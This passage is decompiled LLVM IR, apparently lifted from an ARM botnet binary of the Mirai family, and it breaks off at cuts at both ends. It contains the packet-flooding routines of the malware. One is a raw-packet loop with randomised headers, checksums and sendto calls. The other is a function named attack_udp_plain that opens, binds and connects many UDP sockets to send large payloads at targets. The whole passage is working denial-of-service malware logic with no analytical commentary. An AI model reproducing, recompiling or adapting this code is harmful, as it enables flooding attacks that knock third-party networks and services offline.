  %v2_c810 = call i32 @checksum_generic(i32 %v0_c808, i32 20)
  %v3_c810 = trunc i32 %v2_c810 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c818 = load i32, i32* @r5, align 4
  %v4_c818 = add i32 %v3_c818, 10
  %v5_c818 = inttoptr i32 %v4_c818 to i16*
  store i16 %v3_c810, i16* %v5_c818, align 2
  %v0_c81c = load i32, i32* @r6, align 4
  store i32 %v0_c81c, i32* @r1, align 4
  %v0_c820 = load i32, i32* %r2.global-to-local, align 4
  %v1_c820 = trunc i32 %v0_c820 to i16
  %v3_c820 = add i32 %v0_c81c, 16
  %v4_c820 = inttoptr i32 %v3_c820 to i16*
  store i16 %v1_c820, i16* %v4_c820, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c82c = load i32, i32* @r5, align 4
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  %v4_c830 = call i32 @checksum_tcpudp(i32 %v0_c82c, i32 %v0_c81c, i32 10240, i32 40)
  %v5_c830 = trunc i32 %v4_c830 to i16
  store i32 %v4_c830, i32* %r0.global-to-local, align 4
  %v3_c834 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c834, i32* %r3.global-to-local, align 4
  %v3_c838 = mul i32 %v3_c834, 32
  store i32 %v3_c838, i32* %lr.global-to-local, align 4
  %v3_c83c = load i32, i32* @r6, align 4
  %v4_c83c = add i32 %v3_c83c, 16
  %v5_c83c = inttoptr i32 %v4_c83c to i16*
  store i16 %v5_c830, i16* %v5_c83c, align 2
  %v0_c840 = load i32, i32* %lr.global-to-local, align 4
  %v1_c840 = load i32, i32* %r3.global-to-local, align 4
  %tmp70 = mul i32 %v1_c840, -8
  %v5_c840 = add i32 %v0_c840, %tmp70
  store i32 %v5_c840, i32* %lr.global-to-local, align 4
  %v0_c844 = load i32, i32* @r6, align 4
  %v1_c844 = add i32 %v0_c844, 2
  %v2_c844 = inttoptr i32 %v1_c844 to i16*
  %v3_c844 = load i16, i16* %v2_c844, align 2
  %v4_c844 = zext i16 %v3_c844 to i32
  store i32 %v4_c844, i32* @r6, align 4
  %v1_c848 = load i32, i32* @r7, align 4
  %v2_c848 = add i32 %v1_c848, %v5_c840
  store i32 %v2_c848, i32* @lr, align 4
  %v3_c84c = add i32 %v2_c848, 2
  %v4_c84c = inttoptr i32 %v3_c84c to i16*
  store i16 %v3_c844, i16* %v4_c84c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c858 = load i32, i32* @r5, align 4
  store i32 %v0_c858, i32* %r1.global-to-local, align 4
  %v0_c85c = load i32, i32* @r8, align 4
  store i32 %v0_c85c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c864 = load i32, i32* @lr, align 4
  %v6_c86c = call i32 @__libc_sendto(i32 %v0_c85c, i32 %v0_c858, i32 60, i32 16384, i32 %v0_c864, i32 16)
  %v3_c870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c870, i32* %r3.global-to-local, align 4
  %v1_c874 = add i32 %v3_c870, 1
  store i32 %v1_c874, i32* %r0.global-to-local, align 4
  %v1_c878 = load i32, i32* @sb, align 4
  %v9_c878 = icmp eq i32 %v1_c874, %v1_c878
  store i1 %v9_c878, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c874, i32* %stack_var_-44, align 4
  %v6_c880 = icmp slt i32 %v1_c874, %v1_c878
  br i1 %v6_c880, label %dec_label_pc_c884, label %dec_label_pc_c98c

dec_label_pc_c884:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c7a0
  %v1_c894 = phi i32 [ %v1_c874, %dec_label_pc_c800 ], [ 0, %dec_label_pc_c7a0 ]
  %v5_c888 = mul i32 %v1_c894, 24
  %v1_c88c = load i32, i32* @r7, align 4
  %v2_c88c = add i32 %v1_c88c, %v5_c888
  store i32 %v2_c88c, i32* %r3.global-to-local, align 4
  %v1_c890 = add i32 %v2_c88c, 20
  %v2_c890 = inttoptr i32 %v1_c890 to i8*
  %v3_c890 = load i8, i8* %v2_c890, align 1
  %v4_c890 = zext i8 %v3_c890 to i32
  store i32 %v4_c890, i32* %r2.global-to-local, align 4
  %v0_c894 = load i32, i32* @sl, align 4
  %v4_c894 = mul i32 %v1_c894, 4
  %v5_c894 = add i32 %v0_c894, %v4_c894
  %v6_c894 = inttoptr i32 %v5_c894 to i32*
  %v7_c894 = load i32, i32* %v6_c894, align 4
  store i32 %v7_c894, i32* @r5, align 4
  %v2_c898 = icmp ugt i8 %v3_c890, 30
  %v7_c898 = icmp eq i8 %v3_c890, 31
  store i1 %v7_c898, i1* %cpsr_z.global-to-local, align 1
  %v1_c89c = add i32 %v7_c894, 20
  store i32 %v1_c89c, i32* @r6, align 4
  %v2_c8a0 = xor i1 %v7_c898, true
  %v3_c8a0 = and i1 %v2_c898, %v2_c8a0
  br i1 %v3_c8a0, label %dec_label_pc_c7a8, label %dec_label_pc_c8a4

dec_label_pc_c8a4:                                ; preds = %dec_label_pc_c884
  %v1_c8a4 = add i32 %v2_c88c, 16
  %v2_c8a4 = inttoptr i32 %v1_c8a4 to i32*
  %v3_c8a4 = load i32, i32* %v2_c8a4, align 4
  store i32 %v3_c8a4, i32* %r4.global-to-local, align 4
  %v0_c8a8 = call i32 @rand_next()
  store i32 %v0_c8a8, i32* %r0.global-to-local, align 4
  %v3_c8ac = load i32, i32* %stack_var_-44, align 4
  %v5_c8b4 = mul i32 %v3_c8ac, 24
  %v0_c8b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c8b8 = and i32 %v0_c8b8, 16711680
  %v3_c8bc = udiv i32 %v0_c8b8, 16777216
  %v4_c8c0 = udiv i32 %v1_c8b8, 256
  %v5_c8c0 = or i32 %v4_c8c0, %v3_c8bc
  store i32 %v5_c8c0, i32* %r2.global-to-local, align 4
  %v1_c8c4 = load i32, i32* @r7, align 4
  %v2_c8c4 = add i32 %v1_c8c4, %v5_c8b4
  store i32 %v2_c8c4, i32* %r1.global-to-local, align 4
  %v1_c8c8 = and i32 %v0_c8b8, 65280
  store i32 %v1_c8c8, i32* %r3.global-to-local, align 4
  %v1_c8cc = add i32 %v2_c8c4, 20
  %v2_c8cc = inttoptr i32 %v1_c8cc to i8*
  %v3_c8cc = load i8, i8* %v2_c8cc, align 1
  %v4_c8cc = zext i8 %v3_c8cc to i32
  %v5_c8d4 = call i32 @llvm.bswap.i32(i32 %v0_c8b8)
  %v7_c8d8 = lshr i32 %v0_c8a8, %v4_c8cc
  %v8_c8d8 = add i32 %v7_c8d8, %v5_c8d4
  store i32 %v8_c8d8, i32* %r2.global-to-local, align 4
  %v1_c8dc = and i32 %v8_c8d8, 16711680
  store i32 %v1_c8dc, i32* %r0.global-to-local, align 4
  %v1_c8e8 = and i32 %v8_c8d8, 65280
  store i32 %v1_c8e8, i32* %r1.global-to-local, align 4
  %v5_c8f0 = call i32 @llvm.bswap.i32(i32 %v8_c8d8)
  %v1_c8f4 = load i32, i32* @r5, align 4
  %v2_c8f4 = add i32 %v1_c8f4, 16
  %v3_c8f4 = inttoptr i32 %v2_c8f4 to i32*
  store i32 %v5_c8f0, i32* %v3_c8f4, align 4
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  store i1 %v7_c7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c7ac, label %dec_label_pc_c904, label %dec_label_pc_c7b4

dec_label_pc_c904:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c7a8
  %v0_c904 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c90c = load i32, i32* @r5, align 4
  %v2_c90c = add i32 %v1_c90c, 12
  %v3_c90c = inttoptr i32 %v2_c90c to i32*
  store i32 %v0_c904, i32* %v3_c90c, align 4
  store i32 %v3_c520, i32* %r0.global-to-local, align 4
  %v0_c914 = load i32, i32* %r4.global-to-local, align 4
  %v1_c914 = add i32 %v0_c914, -1
  store i32 %v1_c914, i32* @r4, align 4
  %v9_c918 = icmp eq i32 %v3_c520, %v1_c914
  store i1 %v9_c918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c918, label %dec_label_pc_c920, label %dec_label_pc_c7c8

dec_label_pc_c920:                                ; preds = %dec_label_pc_c904, %dec_label_pc_c7b4
  %v0_c920 = call i32 @rand_next()
  %v1_c920 = trunc i32 %v0_c920 to i16
  store i32 %v0_c920, i32* %r0.global-to-local, align 4
  store i32 %v3_c524, i32* %r1.global-to-local, align 4
  %v1_c928 = load i32, i32* @r4, align 4
  %v9_c928 = icmp eq i32 %v3_c524, %v1_c928
  store i1 %v9_c928, i1* %cpsr_z.global-to-local, align 1
  %v3_c92c = load i32, i32* @r5, align 4
  %v4_c92c = add i32 %v3_c92c, 4
  %v5_c92c = inttoptr i32 %v4_c92c to i16*
  store i16 %v1_c920, i16* %v5_c92c, align 2
  br i1 %v9_c928, label %dec_label_pc_c934, label %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge

dec_label_pc_c920.dec_label_pc_c7d4_crit_edge:    ; preds = %dec_label_pc_c920
  %v1_c7d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7d4

dec_label_pc_c934:                                ; preds = %dec_label_pc_c920, %dec_label_pc_c7c8
  %v0_c934 = call i32 @rand_next()
  %v1_c934 = trunc i32 %v0_c934 to i16
  store i32 %v0_c934, i32* %r0.global-to-local, align 4
  store i32 %v3_c528, i32* %r2.global-to-local, align 4
  %v1_c93c = load i32, i32* @r4, align 4
  %v9_c93c = icmp eq i32 %v3_c528, %v1_c93c
  store i1 %v9_c93c, i1* %cpsr_z.global-to-local, align 1
  %v3_c940 = load i32, i32* @r5, align 4
  %v4_c940 = add i32 %v3_c940, 20
  %v5_c940 = inttoptr i32 %v4_c940 to i16*
  store i16 %v1_c934, i16* %v5_c940, align 2
  br i1 %v9_c93c, label %dec_label_pc_c948, label %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge

dec_label_pc_c934.dec_label_pc_c7e0_crit_edge:    ; preds = %dec_label_pc_c934
  %v1_c7e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7e0

dec_label_pc_c948:                                ; preds = %dec_label_pc_c934, %dec_label_pc_c7d4
  %v0_c948 = call i32 @rand_next()
  %v1_c948 = trunc i32 %v0_c948 to i16
  store i32 %v0_c948, i32* %r0.global-to-local, align 4
  store i32 %v5_c3e0, i32* %r3.global-to-local, align 4
  %v1_c950 = load i32, i32* @r4, align 4
  %v9_c950 = icmp eq i32 %v5_c3e0, %v1_c950
  store i1 %v9_c950, i1* %cpsr_z.global-to-local, align 1
  %v3_c954 = load i32, i32* @r6, align 4
  %v4_c954 = add i32 %v3_c954, 2
  %v5_c954 = inttoptr i32 %v4_c954 to i16*
  store i16 %v1_c948, i16* %v5_c954, align 2
  br i1 %v9_c950, label %dec_label_pc_c95c, label %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge

dec_label_pc_c948.dec_label_pc_c7ec_crit_edge:    ; preds = %dec_label_pc_c948
  %v1_c7f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7ec

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c948, %dec_label_pc_c7e0
  %v0_c95c = call i32 @rand_next()
  %v1_c960 = load i32, i32* @r6, align 4
  %v2_c960 = add i32 %v1_c960, 4
  %v3_c960 = inttoptr i32 %v2_c960 to i32*
  store i32 %v0_c95c, i32* %v3_c960, align 4
  store i32 %v6_c3f8, i32* %r0.global-to-local, align 4
  %v1_c968 = load i32, i32* @r4, align 4
  %v9_c968 = icmp eq i32 %v6_c3f8, %v1_c968
  store i1 %v9_c968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c968, label %dec_label_pc_c970, label %dec_label_pc_c7f8

dec_label_pc_c970:                                ; preds = %dec_label_pc_c95c, %dec_label_pc_c7ec
  %v0_c970 = call i32 @rand_next()
  store i32 %v0_c970, i32* %r0.global-to-local, align 4
  %v0_c974 = load i32, i32* @fp, align 4
  %v2_c974 = icmp eq i32 %v0_c974, 0
  store i1 %v2_c974, i1* %cpsr_z.global-to-local, align 1
  %v1_c978 = load i32, i32* @r6, align 4
  %v2_c978 = add i32 %v1_c978, 8
  %v3_c978 = inttoptr i32 %v2_c978 to i32*
  store i32 %v0_c970, i32* %v3_c978, align 4
  br i1 %v2_c974, label %dec_label_pc_c800, label %dec_label_pc_c980

dec_label_pc_c980:                                ; preds = %dec_label_pc_c7f8, %dec_label_pc_c970
  %v0_c980 = call i32 @rand_next()
  %v1_c980 = trunc i32 %v0_c980 to i16
  store i32 %v0_c980, i32* %r0.global-to-local, align 4
  %v3_c984 = load i32, i32* @r6, align 4
  %v4_c984 = add i32 %v3_c984, 18
  %v5_c984 = inttoptr i32 %v4_c984 to i16*
  store i16 %v1_c980, i16* %v5_c984, align 2
  br label %dec_label_pc_c800

dec_label_pc_c98c:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c790
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c990 = call i32 @__GI_time(i32* null)
  store i32 %v2_c990, i32* %r0.global-to-local, align 4
  store i32 %v2_c4b4, i32* %r3.global-to-local, align 4
  %v9_c998 = icmp eq i32 %v2_c4b4, %v2_c990
  store i1 %v9_c998, i1* %cpsr_z.global-to-local, align 1
  %v6_c99c = icmp slt i32 %v2_c4b4, %v2_c990
  br i1 %v6_c99c, label %dec_label_pc_c9a0, label %dec_label_pc_c98c.dec_label_pc_c790_crit_edge

dec_label_pc_c98c.dec_label_pc_c790_crit_edge:    ; preds = %dec_label_pc_c98c
  %v0_c794.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_c790

dec_label_pc_c9a0:                                ; preds = %dec_label_pc_c98c, %entry, %dec_label_pc_c9ac
  %v1_c9a8 = phi i32 [ %v3_c4c8, %entry ], [ %v1_c9b0, %dec_label_pc_c9ac ], [ %v2_c990, %dec_label_pc_c98c ]
  store i32 %v3_c2e4, i32* %r4.global-to-local, align 4
  store i32 %v24_c2e4, i32* %fp.global-to-local, align 4
  store i32 %v27_c2e4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c9a8

dec_label_pc_c9ac:                                ; preds = %dec_label_pc_c4d8
  %v0_c9ac = load i32, i32* @r8, align 4
  store i32 %v0_c9ac, i32* %r0.global-to-local, align 4
  %v1_c9b0 = call i32 @__GI___libc_close(i32 %v0_c9ac)
  store i32 %v1_c9b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c9a0

; uselistorder directives
  uselistorder i32 %v1_c9b0, { 1, 0 }
  uselistorder i32 %v0_c980, { 1, 0 }
  uselistorder i32 %v0_c948, { 1, 0 }
  uselistorder i32 %v0_c934, { 1, 0 }
  uselistorder i32 %v0_c920, { 1, 0 }
  uselistorder i32 %v1_c914, { 1, 2, 0 }
  uselistorder i32 %v0_c8b8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c874, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_c840, { 1, 0 }
  uselistorder i32 %v4_c830, { 1, 0 }
  uselistorder i1 %v3_c7c0, { 1, 0 }
  uselistorder i1 %v7_c7ac, { 2, 1, 0 }
  uselistorder i32 %v2_c780, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c5e8, { 1, 2, 0 }
  uselistorder i32 %v1_c5ac, { 2, 1, 0 }
  uselistorder i32 %v1_c5a8, { 2, 0, 1 }
  uselistorder i32 %v1_c5a4, { 2, 0, 1 }
  uselistorder i32 %v1_c5a0, { 2, 0, 1 }
  uselistorder i32 %v1_c59c, { 2, 0, 1 }
  uselistorder i32 %v3_c524, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_c520, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c514, { 1, 0, 2 }
  uselistorder i1 %v7_c4f8, { 1, 0 }
  uselistorder i1 %v7_c4cc, { 1, 0 }
  uselistorder i32 %v3_c4c8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_c4b4, { 2, 1, 0 }
  uselistorder i32 %v6_c4a4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v6_c3f8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c3e0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c364, { 1, 0 }
  uselistorder i32 %v7_c34c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 38, 37, 40, 39, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 8, 10, 11, 9, 12, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 36, 33, 34, 35, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 45, { 2, 0, 3, 1, 4 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder i32 42, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 247, { 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_c9a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c980, { 1, 0 }
  uselistorder label %dec_label_pc_c800, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* %stack_var_-80, align 4
  %v2_c9e0 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_c9ec = load i32, i32* @fp, align 4
  store i32 %v0_c9ec, i32* %r0.global-to-local, align 4
  %v2_c9f0 = call i32 @calloc(i32 %v0_c9ec, i32 4)
  store i32 65535, i32* @r6, align 4
  %v0_c9fc = load i32, i32* @r5, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_c9f0, i32* @sb, align 4
  %v0_ca0c = load i32, i32* @r4, align 4
  store i32 %v0_ca0c, i32* %r0.global-to-local, align 4
  %v4_ca10 = inttoptr i32 %v0_c9fc to i32*
  %v5_ca10 = call i32 @attack_get_opt_int(i32 %v0_ca0c, i32* %v4_ca10, i32 7, i32 65535)
  %v0_ca14 = load i32, i32* @r5, align 4
  %v0_ca20 = load i32, i32* @r6, align 4
  store i32 %v0_ca20, i32* %r3.global-to-local, align 4
  %v0_ca24 = load i32, i32* @r4, align 4
  store i32 %v0_ca24, i32* %r0.global-to-local, align 4
  %v3_ca28 = urem i32 %v5_ca10, 65536
  store i32 %v3_ca28, i32* @r8, align 4
  %v4_ca2c = inttoptr i32 %v0_ca14 to i32*
  %v5_ca2c = call i32 @attack_get_opt_int(i32 %v0_ca24, i32* %v4_ca2c, i32 6, i32 %v0_ca20)
  %v0_ca30 = load i32, i32* @r5, align 4
  %v3_ca34 = mul i32 %v5_ca2c, 65536
  store i32 %v3_ca34, i32* @sl, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_ca40 = load i32, i32* @r4, align 4
  store i32 %v0_ca40, i32* %r0.global-to-local, align 4
  %v4_ca44 = inttoptr i32 %v0_ca30 to i32*
  %v5_ca44 = call i32 @attack_get_opt_int(i32 %v0_ca40, i32* %v4_ca44, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ca54 = urem i32 %v5_ca44, 65536
  %v0_ca58 = load i32, i32* @r5, align 4
  %v0_ca5c = load i32, i32* @r4, align 4
  store i32 %v0_ca5c, i32* %r0.global-to-local, align 4
  %v4_ca64 = inttoptr i32 %v0_ca58 to i32*
  %v5_ca64 = call i32 @attack_get_opt_int(i32 %v0_ca5c, i32* %v4_ca64, i32 1, i32 1)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ca70 = urem i32 %v5_ca64, 256
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v2_ca8c = call i32 @__GI_time(i32* null)
  store i32 %v2_ca8c, i32* %r0.global-to-local, align 4
  %v0_ca90 = load i32, i32* @sl, align 4
  %v3_ca90 = udiv i32 %v0_ca90, 65536
  %v1_ca94 = load i32, i32* @r6, align 4
  %v9_ca94 = icmp eq i32 %v3_ca90, %v1_ca94
  br i1 %v9_ca94, label %dec_label_pc_cc68, label %bb

bb:                                               ; preds = %entry
  %v4_ca9c = udiv i32 %v0_ca90, 16777216
  store i32 %v4_ca9c, i32* %r3.global-to-local, align 4
  %v1_caa0 = load i32, i32* @r7, align 4
  %v2_caa0 = add i32 %v1_caa0, %v2_ca8c
  store i32 %v2_caa0, i32* %r0.global-to-local, align 4
  %v2_ca98 = mul nuw nsw i32 %v3_ca90, 256
  %v6_caa4 = or i32 %v2_ca98, %v4_ca9c
  %extract.t58 = trunc i32 %v6_caa4 to i16
  br label %dec_label_pc_cab4

dec_label_pc_cab4:                                ; preds = %bb, %dec_label_pc_cc68
  %v6_caa4.sink.off0 = phi i16 [ %extract.t58, %bb ], [ %extract.t59, %dec_label_pc_cc68 ]
  %v0_caa810 = phi i32 [ %v2_caa0, %bb ], [ %v2_caa013, %dec_label_pc_cc68 ]
  %v0_cab4 = load i32, i32* @fp, align 4
  %v2_cab4 = icmp eq i32 %v0_cab4, 0
  br i1 %v2_cab4, label %dec_label_pc_cbec, label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %dec_label_pc_cab4
  store i32 0, i32* @sl, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v2_cae8 = ptrtoint i32* %stack_var_-56 to i32
  %v4_cb08 = sext i16 %v6_caa4.sink.off0 to i32
  br label %dec_label_pc_cb3c

dec_label_pc_cacc:                                ; preds = %.thread26, %dec_label_pc_cb78
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_cad8 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_cad8, i32* %r0.global-to-local, align 4
  %v7_cadc = icmp eq i32 %v3_cad8, -1
  %v0_cae0 = load i32, i32* @sl, align 4
  %v1_cae0 = add i32 %v0_cae0, 1
  store i32 %v1_cae0, i32* @sl, align 4
  %v0_cae4 = load i32, i32* @r7, align 4
  %v1_cae4 = add i32 %v0_cae4, 24
  store i32 %v1_cae4, i32* @r7, align 4
  %v1_caf0 = load i32, i32* @r6, align 4
  %v2_caf0 = load i32, i32* @sb, align 4
  %v3_caf0 = add i32 %v2_caf0, %v1_caf0
  %v4_caf0 = inttoptr i32 %v3_caf0 to i32*
  store i32 %v3_cad8, i32* %v4_caf0, align 4
  br i1 %v7_cadc, label %dec_label_pc_cc10.loopexit14, label %dec_label_pc_caf8

dec_label_pc_caf8:                                ; preds = %dec_label_pc_cacc
  store i32 2, i32* %stack_var_-56, align 4
  store i32 %v4_cb08, i32* %r3.global-to-local, align 4
  %v0_cb10 = load i32, i32* %r0.global-to-local, align 4
  %v3_cb10 = call i32 @bind(i32 %v0_cb10, i32 %v2_cae8, i32 16)
  store i32 %v3_cb10, i32* %r0.global-to-local, align 4
  %v0_cb14 = load i32, i32* @r5, align 4
  %v1_cb14 = add i32 %v0_cb14, 20
  %v2_cb14 = inttoptr i32 %v1_cb14 to i8*
  %v3_cb14 = load i8, i8* %v2_cb14, align 1
  %v4_cb14 = zext i8 %v3_cb14 to i32
  store i32 %v4_cb14, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_cb14, 32
  br i1 %tmp, label %dec_label_pc_cb8c, label %dec_label_pc_cb20

dec_label_pc_cb20:                                ; preds = %dec_label_pc_caf8
  %v0_cb20 = load i32, i32* @r6, align 4
  %v1_cb20 = load i32, i32* @sb, align 4
  %v2_cb20 = add i32 %v1_cb20, %v0_cb20
  %v3_cb20 = inttoptr i32 %v2_cb20 to i32*
  %v4_cb20 = load i32, i32* %v3_cb20, align 4
  store i32 %v4_cb20, i32* %r0.global-to-local, align 4
  %v3_cb2c = call i32 @__libc_connect(i32 %v4_cb20, i32 %v0_cb14, i32 16)
  store i32 %v3_cb2c, i32* %r0.global-to-local, align 4
  %v0_cb30 = load i32, i32* @sl, align 4
  %v1_cb30 = load i32, i32* @fp, align 4
  %v9_cb30 = icmp eq i32 %v0_cb30, %v1_cb30
  %v0_cb34 = load i32, i32* @r6, align 4
  %v1_cb34 = add i32 %v0_cb34, 4
  store i32 %v1_cb34, i32* @r6, align 4
  br i1 %v9_cb30, label %dec_label_pc_cbec, label %dec_label_pc_cb3c

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_cb8c, %dec_label_pc_cb20, %dec_label_pc_cabc
  store i32 65535, i32* @r4, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  %v2_cb4c = call i32 @calloc(i32 65535, i32 1)
  store i32 %v2_cb4c, i32* %r0.global-to-local, align 4
  %v0_cb50 = load i32, i32* @r8, align 4
  %v3_cb54 = udiv i32 %v0_cb50, 256
  %v1_cb50 = mul i32 %v0_cb50, 256
  %v4_cb58 = and i32 %v1_cb50, 65280
  %v5_cb58 = or i32 %v4_cb58, %v3_cb54
  store i32 %v5_cb58, i32* %r3.global-to-local, align 4
  %v2_cb5c = load i32, i32* %stack_var_-80, align 4
  %v1_cb60 = load i32, i32* @r7, align 4
  %v2_cb60 = add i32 %v1_cb60, %v2_cb5c
  store i32 %v2_cb60, i32* @r5, align 4
  %v1_cb68 = load i32, i32* @r4, align 4
  %v9_cb68 = icmp eq i32 %v0_cb50, %v1_cb68
  %v1_cb6c = load i32, i32* @r6, align 4
  %v3_cb6c = add i32 %v1_cb6c, %v2_c9e0
  %v4_cb6c = inttoptr i32 %v3_cb6c to i32*
  store i32 %v2_cb4c, i32* %v4_cb6c, align 4
  br i1 %v9_cb68, label %dec_label_pc_cb78, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_cb3c
  %v1_cb7027 = load i32, i32* %r3.global-to-local, align 4
  %v2_cb7028 = trunc i32 %v1_cb7027 to i16
  %v3_cb7029 = load i32, i32* @r5, align 4
  %v4_cb7030 = add i32 %v3_cb7029, 2
  %v5_cb7031 = inttoptr i32 %v4_cb7030 to i16*
  store i16 %v2_cb7028, i16* %v5_cb7031, align 2
  br label %dec_label_pc_cacc

dec_label_pc_cb78:                                ; preds = %dec_label_pc_cb3c
  %v0_cb78 = call i32 @rand_next()
  %v1_cb78 = trunc i32 %v0_cb78 to i16
  store i32 %v0_cb78, i32* %r0.global-to-local, align 4
  %v2_cb7c = load i32, i32* %stack_var_-80, align 4
  store i32 %v2_cb7c, i32* %r3.global-to-local, align 4
  %v1_cb80 = load i32, i32* @r7, align 4
  %v2_cb80 = add i32 %v1_cb80, %v2_cb7c
  store i32 %v2_cb80, i32* @r5, align 4
  %v4_cb84 = add i32 %v2_cb80, 2
  %v5_cb84 = inttoptr i32 %v4_cb84 to i16*
  store i16 %v1_cb78, i16* %v5_cb84, align 2
  br label %dec_label_pc_cacc

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_caf8
  %v1_cb8c = add i32 %v0_cb14, 16
  %v2_cb8c = inttoptr i32 %v1_cb8c to i32*
  %v3_cb8c = load i32, i32* %v2_cb8c, align 4
  store i32 %v3_cb8c, i32* @r4, align 4
  %v0_cb90 = call i32 @rand_next()
  store i32 %v0_cb90, i32* %r0.global-to-local, align 4
  %v0_cb94 = load i32, i32* @r4, align 4
  %v1_cba0 = and i32 %v0_cb94, 65280
  store i32 %v1_cba0, i32* %r3.global-to-local, align 4
  %v0_cba4 = load i32, i32* @r5, align 4
  %v1_cba4 = add i32 %v0_cba4, 20
  %v2_cba4 = inttoptr i32 %v1_cba4 to i8*
  %v3_cba4 = load i8, i8* %v2_cba4, align 1
  %v4_cba4 = zext i8 %v3_cba4 to i32
  %v5_cbac = call i32 @llvm.bswap.i32(i32 %v0_cb94)
  %v7_cbb0 = lshr i32 %v0_cb90, %v4_cba4
  %v8_cbb0 = add i32 %v7_cbb0, %v5_cbac
  %v1_cbb4 = and i32 %v8_cbb0, 16711680
